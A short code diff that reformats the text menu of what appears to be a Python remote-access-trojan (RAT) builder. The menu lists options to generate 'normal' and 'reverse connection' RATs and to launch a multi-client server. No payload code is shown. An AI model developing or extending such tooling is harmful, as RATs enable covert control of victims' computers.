@@ -44,11 +44,11 @@ def main():
     ____)_/\_(____`.  `-._______________________________________.'/         
    (___._/  \_.___) `-.________________________________________.-'          
 
-                 {Fore.RED}[ {Fore.CYAN}1 {Fore.RED}]{Fore.CYAN}Client launcher{Fore.RED}              [ {Fore.CYAN}2 {Fore.RED}] {Fore.CYAN}Generate normal connection rat
+                 {Fore.RED}[ {Fore.CYAN}1 {Fore.RED}]{Fore.CYAN}Client launcher{Fore.RED}                      [ {Fore.CYAN}2 {Fore.RED}] {Fore.CYAN}Generate normal connection rat
                                                                                                    
-                 {Fore.RED}[ {Fore.CYAN}3 {Fore.RED}]{Fore.CYAN}Server launcher{Fore.RED}              [ {Fore.CYAN}4 {Fore.RED}] {Fore.CYAN}Generate reverse connection rat 
+                 {Fore.RED}[ {Fore.CYAN}3 {Fore.RED}]{Fore.CYAN}Server launcher(Multiple clients){Fore.RED}    [ {Fore.CYAN}4 {Fore.RED}] {Fore.CYAN}Generate reverse connection rat 
 
-                 {Fore.RED}[ {Fore.CYAN}5 {Fore.RED}] {Fore.CYAN}Developer information{Fore.RED}       [ {Fore.CYAN}6 {Fore.RED}] {Fore.CYAN}Check for updates
+                 {Fore.RED}[ {Fore.CYAN}5 {Fore.RED}] {Fore.CYAN}Developer information{Fore.RED}               [ {Fore.CYAN}6 {Fore.RED}] {Fore.CYAN}Check for updates
                   
                   {Fore.LIGHTGREEN_EX}Enter your selection :{Fore.MAGENTA} """)
   clear()
